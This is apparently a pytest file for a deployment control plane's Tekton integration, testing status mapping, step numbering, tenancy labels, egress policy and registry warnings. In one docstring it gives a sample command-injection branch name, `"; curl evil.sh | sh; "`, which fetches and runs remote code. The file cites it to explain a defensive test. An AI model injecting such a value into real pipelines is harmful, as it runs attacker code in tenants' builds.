"""Tekton status translation and run lifecycle.

Tested against recorded API objects rather than a live Tekton: the mapping is
where the bugs are, and a cluster-backed test would not exercise the awkward
cases (a run with no conditions yet, a cancellation that looks like a failure)
on demand anyway.
"""

import uuid

import pytest
from controlplane.core.tekton_status import condition_status, pipeline_steps, taskrun_state
from controlplane.core.validation import k8s_namespace
from controlplane.runners import tekton


def _run(status=None, reason="", message=""):
    conditions = []
    if status is not None:
        conditions = [{"type": "Succeeded", "status": status, "reason": reason, "message": message}]
    return {"status": {"conditions": conditions}}


def _taskrun(task, status, reason="", start=None, end=None, message=""):
    return {
        "metadata": {"name": f"run-xyz-{task}", "labels": {"tekton.dev/pipelineTask": task}},
        "status": {
            "conditions": [{"type": "Succeeded", "status": status, "reason": reason, "message": message}],
            **({"startTime": start} if start else {}),
            **({"completionTime": end} if end else {}),
        },
    }


@pytest.mark.parametrize(
    "status,reason,expected",
    [
        ("True", "Succeeded", "succeeded"),
        ("False", "Failed", "failed"),
        ("False", "TaskRunTimeout", "failed"),
        ("False", "TaskRunImagePullFailed", "failed"),
        ("Unknown", "Running", "running"),
        ("Unknown", "", "running"),
    ],
)
def test_condition_maps_onto_the_shared_vocabulary(status, reason, expected):
    assert condition_status(_run(status, reason)) == expected


@pytest.mark.parametrize("reason", ["Cancelled", "TaskRunCancelled", "PipelineRunCancelled"])
def test_a_cancelled_run_is_not_reported_as_a_failure(reason):
    """Tekton reports a cancellation with condition status "False", exactly
    like a genuine failure. Without the reason check the tenant is told their
    deployment broke when in fact they stopped it."""
    assert condition_status(_run("False", reason)) == "cancelled"


@pytest.mark.parametrize("reason", ["Pending", "PipelineRunPending"])
def test_a_run_that_has_not_started_is_pending_not_running(reason):
    assert condition_status(_run("Unknown", reason)) == "pending"


def test_an_unreconciled_object_is_pending_not_failed():
    """A PipelineRun read the instant after creation has no conditions at all.
    Reading conditions[0] blindly raises; treating "not succeeded" as failure
    fails every run the moment it is looked at."""
    assert condition_status({}) == "pending"
    assert condition_status({"status": {}}) == "pending"
    assert condition_status(_run(None)) == "pending"


def test_condition_is_found_by_type_not_by_position():
    """The condition list is not ordered by contract."""
    obj = {"status": {"conditions": [
        {"type": "Something", "status": "False"},
        {"type": "Succeeded", "status": "True"},
    ]}}
    assert condition_status(obj) == "succeeded"


def test_step_is_named_for_the_pipeline_task_not_the_taskrun():
    """Tekton suffixes TaskRun names with a random string, so the raw name
    would show the tenant "deploy-run-8f2kd-build" where "build" is meant."""
    state = taskrun_state(_taskrun("build", "True", "Succeeded"))

    assert state.name == "build"


def test_step_timestamps_are_parsed_from_rfc3339():
    state = taskrun_state(
        _taskrun("build", "True", "Succeeded", start="2026-01-01T10:00:00Z", end="2026-01-01T10:02:30Z")
    )

    assert state.started_at is not None and state.finished_at is not None
    assert (state.finished_at - state.started_at).total_seconds() == 150


def test_failure_message_is_carried_but_success_message_is_not():
    failed = taskrun_state(_taskrun("scan", "False", "Failed", message="Image blocked: 3 CRITICAL/HIGH."))
    passed = taskrun_state(_taskrun("scan", "True", "Succeeded", message="All Tasks completed"))

    assert failed.error_message == "Image blocked: 3 CRITICAL/HIGH."
    assert passed.error_message is None


def test_declared_tasks_all_appear_before_any_of_them_runs():
    """The graph must show the shape of the pipeline up front. Deriving the
    step list from the TaskRuns instead would grow boxes as it went."""
    steps = pipeline_steps(_run("Unknown", "Running"), [], tekton.TEKTON_PIPELINE_TASKS)

    assert [s.name for s in steps] == tekton.TEKTON_PIPELINE_TASKS
    assert {s.status for s in steps} == {"pending"}


def test_tasks_after_a_failure_are_skipped_not_pending():
    """Once the run is over, a task with no TaskRun never got to run. Leaving
    it "pending" would show a finished pipeline as still having work to do."""
    taskruns = [
        _taskrun("clone", "True", "Succeeded"),
        _taskrun("secret-scan", "True", "Succeeded"),
        _taskrun("dependency-scan", "True", "Succeeded"),
        _taskrun("build", "False", "Failed"),
    ]
    steps = pipeline_steps(_run("False", "Failed"), taskruns, tekton.TEKTON_PIPELINE_TASKS)

    assert [(s.name, s.status) for s in steps] == [
        ("clone", "succeeded"), ("secret-scan", "succeeded"), ("dependency-scan", "succeeded"),
        ("build", "failed"), ("scan", "skipped"),
    ]


def test_pipelinerun_namespace_is_derived_not_supplied():
    """The tenancy boundary: nothing a caller passes can move a build into
    another tenant's namespace."""
    project_id = uuid.uuid4()
    obj = tekton.render_pipelinerun(
        project_id, uuid.uuid4(), "https://example/r.git", "main", "reg/img:tag", "sa",
    )

    assert obj["metadata"]["namespace"] == k8s_namespace(project_id)


def test_pipelinerun_uses_the_tenants_service_account():
    obj = tekton.render_pipelinerun(
        uuid.uuid4(), uuid.uuid4(), "https://example/r.git", "main", "reg/img:tag", "tenant-sa",
    )

    assert obj["spec"]["taskRunTemplate"]["serviceAccountName"] == "tenant-sa"


def test_pipelinerun_names_are_unique_per_deploy():
    """Tekton refuses to overwrite an existing PipelineRun, so a fixed name
    makes every deploy after the first fail with AlreadyExists."""
    deployment_id = uuid.uuid4()
    first = tekton.render_pipelinerun(uuid.uuid4(), deployment_id, "u", "main", "i", "sa")
    second = tekton.render_pipelinerun(uuid.uuid4(), deployment_id, "u", "main", "i", "sa")

    assert first["metadata"]["name"] != second["metadata"]["name"]


def test_pipelinerun_carries_a_timeout():
    """SANDBOX_* wall-clock limits are docker flags and do not apply to a Pod.
    Without this a wedged build holds its workspace volume indefinitely."""
    obj = tekton.render_pipelinerun(uuid.uuid4(), uuid.uuid4(), "u", "main", "i", "sa", timeout="12m")

    assert obj["spec"]["timeouts"]["pipeline"] == "12m"


def test_pipeline_yaml_declares_exactly_the_tasks_the_runner_expects():
    """A rename on one side draws a graph with a permanently-pending box."""
    import pathlib

    import yaml

    root = pathlib.Path(__file__).resolve().parents[2]
    docs = [d for d in yaml.safe_load_all((root / "k8s/tekton/pipeline.yaml").read_text()) if d]
    pipeline = next(d for d in docs if d["kind"] == "Pipeline")

    assert [t["name"] for t in pipeline["spec"]["tasks"]] == tekton.TEKTON_PIPELINE_TASKS


class _FakeKubectl:
    """Returns a scripted sequence of PipelineRun snapshots."""

    def __init__(self, snapshots):
        self.snapshots = list(snapshots)
        self.calls = []

    def __call__(self, args):
        self.calls.append(args)
        import json as _json

        if args[1] == "taskrun":
            return _json.dumps({"items": []})
        snapshot = self.snapshots[0] if len(self.snapshots) == 1 else self.snapshots.pop(0)
        return _json.dumps(snapshot)


def test_wait_polls_until_terminal_and_reports_every_snapshot():
    fake = _FakeKubectl([_run("Unknown", "Running"), _run("Unknown", "Running"), _run("True", "Succeeded")])
    seen = []

    result = tekton.wait(
        tekton.KubectlCaller(fake), "p-abc", "deploy-1",
        on_state=seen.append, poll_seconds=0, sleep=lambda _: None,
    )

    assert result.status == "succeeded"
    assert [s.status for s in seen] == ["running", "running", "succeeded"]


def test_wait_gives_up_rather_than_polling_forever():
    fake = _FakeKubectl([_run("Unknown", "Running")])

    with pytest.raises(tekton.TektonError, match="timed out"):
        tekton.wait(
            tekton.KubectlCaller(fake), "p-abc", "deploy-1",
            poll_seconds=0, timeout_seconds=0, sleep=lambda _: None,
        )


def test_taskruns_are_filtered_to_this_run():
    """Listing the namespace unfiltered would mix in a concurrent deploy of a
    different service and attribute its steps to this one."""
    fake = _FakeKubectl([_run("True", "Succeeded")])

    tekton.read(tekton.KubectlCaller(fake), "p-abc", "deploy-1")

    taskrun_call = next(call for call in fake.calls if call[1] == "taskrun")
    assert "tekton.dev/pipelineRun=deploy-1" in taskrun_call


def test_unreadable_kubectl_output_is_an_error_not_an_empty_run():
    """Parsing failure must not look like "the run has no steps and is
    pending" — that would poll forever against a broken cluster."""
    with pytest.raises(tekton.TektonError, match="could not read"):
        tekton.KubectlCaller(lambda args: "not json").json(["get", "pipelinerun"])


def _project(mode):
    from controlplane.models import Project

    project = Project()
    project.id = uuid.uuid4()
    project.team_id = uuid.uuid4()
    project.infra_spec = {"mode": mode}
    return project


def test_tekton_is_off_by_default():
    """Switching it on replaces the runner that enforces no-docker-socket and
    no-secret-in-argv with one whose equivalents are cluster objects that have
    to exist first. A default of "on" breaks every deploy on a cluster without
    Tekton installed."""
    from controlplane.core.config import settings

    assert settings.tekton_enabled is False


def test_tekton_never_applies_to_a_vm_mode_project():
    """A VM-mode project's own cluster has no Tekton controller, so a
    PipelineRun there is an object nothing reconciles and the deploy hangs on
    a run that never starts."""
    from controlplane.tests.conftest import override_settings
    from controlplane.workers import tasks

    with override_settings(tekton_enabled=True):
        assert tasks._tekton_applies_to(_project("vm")) is False
        assert tasks._tekton_applies_to(_project("namespace")) is True

    with override_settings(tekton_enabled=False):
        assert tasks._tekton_applies_to(_project("namespace")) is False


class _Stage:
    def __init__(self, name, run="true", image=""):
        self.name, self.run, self.image = name, run, image


def test_step_indices_line_up_with_the_builtin_nine_when_there_are_no_stages():
    """The graph unions job_steps rows with the deploy template. Numbering the
    five tasks 1..5 would put "scan" where the template says "trivy scan"
    only by luck and every earlier row would be wrong."""
    from controlplane.workers.steps import JOB_STEP_TEMPLATES

    template = JOB_STEP_TEMPLATES["deploy"]
    indices = tekton.step_indices([])

    assert indices == {"clone": 1, "secret-scan": 2, "dependency-scan": 3, "build": 4, "scan": 6}
    assert "clon" in template[indices["clone"] - 1]
    assert "secret" in template[indices["secret-scan"] - 1] or "gitleaks" in template[indices["secret-scan"] - 1]
    assert "dependency" in template[indices["dependency-scan"] - 1] or "pip-audit" in template[indices["dependency-scan"] - 1]
    assert "build" in template[indices["build"] - 1]
    assert "trivy" in template[indices["scan"] - 1]
    assert "push" in template[tekton.push_step_index([]) - 1]


def test_tenant_stages_shift_the_builtin_steps():
    """Stages run after clone and the two scan gates, exactly as on the
    sandbox path, so a two-stage repository pushes build/scan two places
    along from their no-stages position."""
    stages = [_Stage("unit tests"), _Stage("lint")]
    indices = tekton.step_indices(stages)

    assert indices["clone"] == 1
    assert indices["secret-scan"] == 2
    assert indices["dependency-scan"] == 3
    assert indices[tekton.stage_task_name(1, "unit tests")] == 4
    assert indices[tekton.stage_task_name(2, "lint")] == 5
    assert indices["build"] == 6
    assert tekton.push_step_index(stages) == 7
    assert indices["scan"] == 8


def test_stages_become_tasks_between_the_scan_gates_and_build():
    """A failing test must stop the pipeline before it spends a build slot —
    and secret/dependency scanning must stop it earlier still, since a
    checkout that leaks a credential should never reach a test runner either."""
    spec = tekton.build_pipeline_spec([_Stage("unit tests"), _Stage("lint")], "sandbox:latest")
    order = [t["name"] for t in spec["tasks"]]

    assert order[:3] == ["clone", "secret-scan", "dependency-scan"]
    assert order[-2:] == ["build", "scan"]
    assert len(order) == 7
    # Each stage runs after the previous one, so they are sequential rather
    # than a fan-out that would let a later stage start before an earlier
    # one failed.
    build = next(t for t in spec["tasks"] if t["name"] == "build")
    assert build["runAfter"] == [order[-3]]


def test_stage_names_are_sanitised_but_the_tenants_wording_is_kept():
    """Tekton object names are DNS-1123 labels; "unit tests" is not one. The
    tenant must still see their own wording in the graph."""
    spec = tekton.build_pipeline_spec([_Stage("Unit Tests & Lint!")], "sandbox:latest")
    task = spec["tasks"][3]

    assert task["name"] == tekton.stage_task_name(1, "Unit Tests & Lint!")
    assert task["name"].replace("-", "").isalnum()
    # An annotation: label values must be DNS-safe, and "Unit Tests & Lint!"
    # is not — Kubernetes rejects the TaskRun and the pipeline dies at the
    # first stage with an error about label syntax.
    assert task["taskSpec"]["metadata"]["annotations"]["controlplane.io/stage-name"] == "Unit Tests & Lint!"


def test_two_stages_with_the_same_name_do_not_collide():
    """Tekton rejects a pipeline with duplicate task names outright, with an
    error that names neither stage."""
    spec = tekton.build_pipeline_spec([_Stage("test"), _Stage("test")], "sandbox:latest")
    names = [t["name"] for t in spec["tasks"]]

    assert len(names) == len(set(names))


def test_a_stage_runs_in_the_image_it_asked_for():
    spec = tekton.build_pipeline_spec([_Stage("unit tests", image="python:3.11-slim")], "sandbox:latest")
    step = spec["tasks"][3]["taskSpec"]["steps"][0]

    assert step["image"] == "python:3.11-slim"


def test_a_stage_without_an_image_falls_back_to_the_sandbox_image():
    spec = tekton.build_pipeline_spec([_Stage("unit tests")], "sandbox:latest")

    assert spec["tasks"][3]["taskSpec"]["steps"][0]["image"] == "sandbox:latest"


def test_generated_dockerfile_travels_as_a_base64_parameter():
    """Under Tekton the checkout only exists in the cluster, so a Dockerfile
    written on the control-plane host would never reach kaniko. Base64 because
    Tekton splices params textually into the task's shell script, and a
    Dockerfile's own quotes and newlines do not survive that — kaniko then
    fails with "arrays must be comprised of strings only", which names neither
    the cause nor the file."""
    import base64

    body = 'FROM alpine:3.20\nCMD ["true"]\n'
    obj = tekton.render_pipelinerun(
        uuid.uuid4(), uuid.uuid4(), "u", "main", "img", "sa", dockerfile=body,
    )
    params = {p["name"]: p["value"] for p in obj["spec"]["params"]}

    assert base64.b64decode(params["dockerfile-b64"]).decode() == body
    # Nothing that could end a shell string or start a command.
    assert not set(params["dockerfile-b64"]) & set("\"'`$\\ \n;|&")


def test_tenant_supplied_values_are_not_spliced_into_the_task_script():
    """Tekton substitutes $(params.x) textually. A branch named
    `"; curl evil.sh | sh; "` pasted into the clone script would execute, and
    the branch is tenant-supplied. Reading params from the environment makes
    the shell treat them as data."""
    import pathlib

    import yaml

    root = pathlib.Path(__file__).resolve().parents[2]
    docs = [d for d in yaml.safe_load_all((root / "k8s/tekton/pipeline.yaml").read_text()) if d]
    clone = next(d for d in docs if d["kind"] == "Task" and d["metadata"]["name"] == "clone")
    step = clone["spec"]["steps"][0]

    assert "$(params.revision)" not in step["script"]
    assert "$(params.repo-url)" not in step["script"]
    assert "$(params.dockerfile-b64)" not in step["script"]

    env = {e["name"]: e["value"] for e in step["env"]}
    assert env["REVISION"] == "$(params.revision)"
    assert env["REPO_URL"] == "$(params.repo-url)"


def test_clone_task_never_overwrites_a_repositorys_own_dockerfile():
    """The platform's guess must not replace a Dockerfile the repository
    ships, which would silently build a different image."""
    import pathlib

    import yaml

    root = pathlib.Path(__file__).resolve().parents[2]
    docs = [d for d in yaml.safe_load_all((root / "k8s/tekton/pipeline.yaml").read_text()) if d]
    clone = next(d for d in docs if d["kind"] == "Task" and d["metadata"]["name"] == "clone")
    script = clone["spec"]["steps"][0]["script"]

    assert "! -f \"$(workspaces.source.path)/repo/Dockerfile\"" in script


def test_declared_task_list_includes_tenant_stages():
    """Defaulting to the built-in five would drop every tenant stage out of
    the graph."""
    stages = [_Stage("unit tests")]

    assert tekton.pipeline_task_names(stages) == [
        "clone", "secret-scan", "dependency-scan",
        tekton.stage_task_name(1, "unit tests"), "build", "scan",
    ]


def test_no_label_value_can_carry_free_text():
    """Regression: a stage named "unit tests" put a space into a label value,
    and Kubernetes refused to create the TaskRun at all. Free text belongs in
    an annotation; every label value here must satisfy the DNS-safe rule
    Kubernetes enforces."""
    import re

    label_value = re.compile(r"^(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?$")
    spec = tekton.build_pipeline_spec(
        [_Stage("unit tests"), _Stage("lint & check"), _Stage("A" * 80)], "sandbox:latest"
    )

    for task in spec["tasks"]:
        for key, value in (task.get("taskSpec", {}).get("metadata", {}).get("labels", {})).items():
            assert label_value.match(value), f"{key}={value!r} is not a valid label value"
        assert len(task["name"]) <= 63


def test_pipelinerun_labels_are_valid_too():
    import re

    label_value = re.compile(r"^(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?$")
    obj = tekton.render_pipelinerun(uuid.uuid4(), uuid.uuid4(), "u", "main", "i", "sa")

    for key, value in obj["metadata"]["labels"].items():
        assert label_value.match(value), f"{key}={value!r} is not a valid label value"


def test_stage_steps_declare_their_own_modest_resources():
    """Without these the namespace LimitRange default applies — 500m of limit
    per step — and a tenant whose app already uses most of its quota cannot run
    a stage at all: the pod is refused with "exceeded quota" before the stage's
    command is reached."""
    spec = tekton.build_pipeline_spec([_Stage("unit tests")], "sandbox:latest")
    resources = spec["tasks"][3]["taskSpec"]["steps"][0]["computeResources"]

    assert resources["requests"]["cpu"] == "50m"
    assert resources["limits"]["cpu"] == "250m"


def test_tekton_pushes_to_the_in_cluster_registry_address():
    """A build pod resolving `localhost` reaches itself, so kaniko fails the
    push-permission check against its own loopback. The sandbox path never hit
    this because it pushes from the host, where that address is correct."""
    from controlplane.tests.conftest import override_settings
    from controlplane.workers.tasks import _registry_scan_ref

    with override_settings(registry="localhost:5000", registry_internal="kind-registry:5000"):
        assert _registry_scan_ref("localhost:5000/team/app:commit-abc") == "kind-registry:5000/team/app:commit-abc"


def _spec():
    from controlplane.schemas.spec import InfraSpec

    return InfraSpec.model_validate(
        {
            "project": "demo",
            "mode": "namespace",
            "network": {"cidr": "192.168.56.0/24", "domain": "devops.local"},
            "nodes": [
                {"name": "n1", "vcpu": 2, "memory_mb": 4096, "disk_gb": 20, "role": "k8s_master"}
            ],
        }
    )


def test_build_egress_policy_is_absent_unless_tekton_and_a_registry_cidr_are_set():
    """Opening a hole in the tenant default-deny egress must be a deliberate
    configuration, not something that appears because Tekton got installed."""
    from controlplane.renderers.namespace import build_manifests
    from controlplane.tests.conftest import override_settings

    with override_settings(tekton_enabled=False, registry_cidr="172.18.0.0/16"):
        kinds = [(m["kind"], m["metadata"]["name"]) for m in build_manifests(_spec(), "p-abc")]
        assert not any("allow-build-registry" in name for _, name in kinds)

    with override_settings(tekton_enabled=True, registry_cidr=""):
        kinds = [(m["kind"], m["metadata"]["name"]) for m in build_manifests(_spec(), "p-abc")]
        assert not any("allow-build-registry" in name for _, name in kinds)


def test_build_egress_policy_selects_only_build_pods_and_only_the_registry():
    """A tenant's application pods must keep the unmodified default-deny
    egress: this rule exists for the push, not as a general exemption."""
    from controlplane.renderers.namespace import build_manifests
    from controlplane.tests.conftest import override_settings

    with override_settings(
        tekton_enabled=True, registry_cidr="172.18.0.2/32", registry_internal="kind-registry:5000"
    ):
        policy = next(
            m for m in build_manifests(_spec(), "p-abc")
            if m["kind"] == "NetworkPolicy" and "allow-build-registry" in m["metadata"]["name"]
        )

    assert policy["spec"]["policyTypes"] == ["Egress"]
    assert policy["spec"]["podSelector"]["matchExpressions"][0]["key"] == "tekton.dev/pipelineRun"
    egress = policy["spec"]["egress"][0]
    assert egress["to"][0]["ipBlock"]["cidr"] == "172.18.0.2/32"
    assert egress["ports"] == [{"protocol": "TCP", "port": 5000}]


def test_no_egress_warning_when_the_cidr_is_configured():
    assert tekton.registry_egress_warning("kind-registry:5000", "172.18.0.2/32") == ""


def test_no_egress_warning_for_a_public_registry():
    """The default-deny egress allows public ranges, so nothing is blocked."""
    assert tekton.registry_egress_warning("8.8.8.8:5000", "") == ""


def test_egress_warning_for_a_private_registry_with_no_cidr():
    """A build resolves the registry, hangs on the push and fails on the
    wall-clock timeout — thirty minutes later, naming a connection to an
    address the tenant never configured. Saying it up front costs nothing."""
    warning = tekton.registry_egress_warning("172.18.0.2:5000", "")

    assert "REGISTRY_CIDR" in warning
    assert "172.18.0.2/32" in warning


def test_egress_warning_is_silent_when_the_host_cannot_be_resolved():
    """DNS that does not resolve here may resolve inside the cluster; guessing
    would put a wrong warning in every tenant's build log."""
    assert tekton.registry_egress_warning("registry.invalid.example:5000", "") == ""


def test_loopback_registry_points_at_registry_internal_not_at_the_cidr():
    """127.0.0.1 is private by ipaddress's reckoning, but opening
    REGISTRY_CIDR for it would not help: inside a build pod that address is
    the pod itself. Suggesting the CIDR would send the reader the wrong way."""
    warning = tekton.registry_egress_warning("localhost:5000", "")

    assert "REGISTRY_INTERNAL" in warning
    assert "REGISTRY_CIDR" not in warning
